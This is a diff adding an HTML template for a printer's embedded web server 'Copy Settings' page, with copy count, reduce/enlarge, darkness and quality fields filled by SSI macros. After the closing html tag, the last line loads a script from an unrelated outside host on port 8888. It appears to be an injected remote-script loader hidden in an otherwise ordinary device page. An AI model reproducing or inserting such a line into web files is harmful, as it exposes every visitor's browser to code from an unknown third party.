@@ -1,0 +1,138 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- 
+
+ copy.html
+
+ Copy Defaults for the Toolbox Configuration Function
+
+ ************************************************************
+   (c) Copyright 2008-2009 Marvell International Ltd.      
+  
+                 Marvell Confidential
+ *===========================================================
+
+ This file is intended only for the uses agreed to. 
+
+ You are hereby notified that any dissemination, distribution or copying of 
+ this material accept for the purposes agreed to is strictly prohibited.
+
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title id="pageTitle" >Copy Settings</title>
+
+<script type="text/javascript">
+<!--
+var pageNav = function(theURL) {
+
+    window.open(theURL, "_self");
+    
+    return true;
+
+};
+
+var showDefaultsThisPage = function(theURL) {
+
+    return true;
+
+};
+
+var saveThisPage = function(theURL) {
+
+    return true;
+
+};
+
+
+// Provided for any necessary left navigation initialization
+var initializeLeftNav = function(myDoc) {
+
+   // Developer may override this function for special client services functions
+
+};
+
+// Provided for any necessary page initialization
+var initializePage = function() {
+
+   initializeLeftNav(document);
+   
+}
+
+//-->
+</script>
+
+<script type="text/javascript" src="/js/client-tools.js"></script>
+
+<!--#cspi IDm TOOLBOX_JS_MACRO -->
+
+<style type="text/css">
+<!--#ssi INCLUDE /toolbox.css -->
+</style>
+
+</head>
+
+<body onload="initializePage()">
+
+    <!--#ssi INCLUDE /leftNav.html -->
+    
+    <div class="heading1" id="topOfPageRow">
+        <span id="deviceModelLabel"><!--#ssi IDr OID_PLATFORM_PRINT_NAME_STRING --></span> 
+    </div> <!-- end of div 'topOfPageRow'  -->
+
+    <div id="pageBodyDiv">
+    
+        <div class="heading1" id="topPageHeadingDiv">
+            <span id="currentPageLabel" class="topPageLabel"><!--#ssi IDs STRING_EWS_COPY_SETTINGS --></span>
+        </div> <!-- end of div 'topPageHeadingDiv'  -->
+        
+        <div class="heading2" id="topPageLabelsDiv">
+            <span id="pageInstructions" ><!--#ssi IDs STRING_EWS_COPY_SETTINGS_NAV_LABEL --></span>
+        </div> <!-- end of div 'topPageLabelsDiv'  -->
+        
+        <div id="pageDialogDiv">
+
+            <div id="topPageHorizontalRule" >
+                <hr class="aRuleLine" /> 
+            </div>
+
+            <div id="copyDialogTable">
+ 
+                <div id="dialogLabels">
+
+                    <div class="dialogRowA"><span id="numberOfCopiesLabel" ><!--#ssi IDs STRING_EWS_NUM_COPIES --></span> </div>
+                    <div class="dialogRowB"><span id="reduceEnlargeLabel" ><!--#ssi IDs STRING_EWS_REDUCE --></span> </div>
+                    <div class="dialogRowA"><span id="lightDarkLabel" ><!--#ssi IDs STRING_EWS_DARKEN --></span> </div>
+                    <div class="dialogRowB"><span id="copyQualityLabel" ><!--#ssi IDs STRING_EWS_QUALITY --></span> </div>
+
+                </div> <!-- end of div 'dialogLabels'  -->
+
+                <div id="dialogFields">
+
+                    <div class="dialogRowA"><span id="numberOfCopies" class="dialogInput"><!--#ssi IDr OID_SCAN_COPY_NUMBER_OF_COPIES --></span> </div> 
+                    <div class="dialogRowB"><span id="reduceEnlargePercent" class="dialogInput"><!--#ssi IDr OID_SCAN_COPY_REDUCE_ENLARGE --></span> </div> 
+                    <div class="dialogRowA"><span id="lightDarkLevel" class="dialogInput" ><!--#ssi IDr OID_SCAN_COPY_LIGHT_DARK --></span> </div> 
+                    <div class="dialogRowB"><span id="copyQuality" class="dialogInput" ><!--#ssi IDr OID_STRING_MGR_SCAN_COPY_QUALITY --></span> </div> 
+
+                </div> <!-- end of div 'dialogFields'  -->
+
+            </div> <!-- end of div 'copyDialogTable'  -->
+            
+            <div id="allButtonsDiv">
+                <div id="bottomPageHorizontalRule" >
+                    <hr class="aRuleLine" />
+                </div>
+                <div id="errorMessageDiv">
+                    <span id="errorMessage" > &nbsp </span>
+                </div>
+                <div id="refreshButtonCell"> 
+                    <input class="button" type="submit" id="refreshButton" value="<!--#ssi IDs STRING_EWS_REFRESH_BUTTON_LABEL -->" onclick="javascript:pageNav('/view/copy');"/>
+                </div>
+            </div> <!-- end of div 'allButtonsDiv'  -->
+        
+        </div>  <!-- end of div 'pageDialogDiv'  -->
+    
+    </div> <!-- end of div 'pageBodyDiv'  -->
+
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
